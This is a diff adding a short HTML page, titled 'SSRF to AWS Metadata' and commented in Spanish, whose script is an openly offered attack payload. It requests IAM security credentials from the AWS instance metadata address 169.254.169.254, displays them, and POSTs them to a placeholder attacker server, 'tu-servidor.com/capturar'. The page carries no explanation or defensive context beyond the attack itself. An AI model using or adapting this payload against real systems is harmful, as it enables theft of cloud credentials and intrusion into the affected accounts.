@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SSRF to AWS Metadata</title>
+</head>
+<body>
+  <h1>SSRF Attack</h1>
+  <p id="status">Fetching AWS metadata...</p>
+
+  <script>
+    // Hacer una solicitud a la metadata de AWS
+    fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+      .then(response => response.text())
+      .then(data => {
+        // Mostrar la metadata obtenida en el HTML
+        document.getElementById('status').textContent = 'AWS Metadata: ' + data;
+
+        // Opcional: Enviar la metadata obtenida a tu servidor
+        fetch('https://tu-servidor.com/capturar', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ metadata: data })
+        });
+      })
+      .catch(error => {
+        document.getElementById('status').textContent = 'Error fetching metadata: ' + error;
+      });
+  </script>
+</body>
+</html>
